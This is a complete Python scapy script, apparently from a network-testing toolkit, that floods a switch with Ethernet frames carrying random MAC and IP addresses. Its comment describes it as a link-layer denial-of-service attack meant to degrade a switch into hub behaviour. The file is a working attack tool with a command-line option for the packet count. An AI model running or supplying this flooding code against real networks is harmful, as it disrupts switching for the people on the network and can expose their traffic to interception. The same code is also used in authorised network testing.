# coding=utf-8
"""
DATE:   2021/11/22
AUTHOR: TesterCC
"""
import json
import optparse

from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, ICMP

ret = dict()
ret['status'] = None


# 数据链路层拒绝服务攻击，攻击目的是使交换机功能降级为集线器，无回显。
def start_attack(count):
    for i in range(count):
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP()) / ICMP()
        time.sleep(0.3)
        sendp(packet, verbose=False)
        # print(packet.summary())
    ret['status'] = 'success'


def main():
    parser = optparse.OptionParser('usage: python %prog --count 200 \n')
    parser.add_option('-c', '--count', dest='attack_count', default='100', type='string', help='send packet count')
    options, args = parser.parse_args()
    start_attack(int(options.attack_count))
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
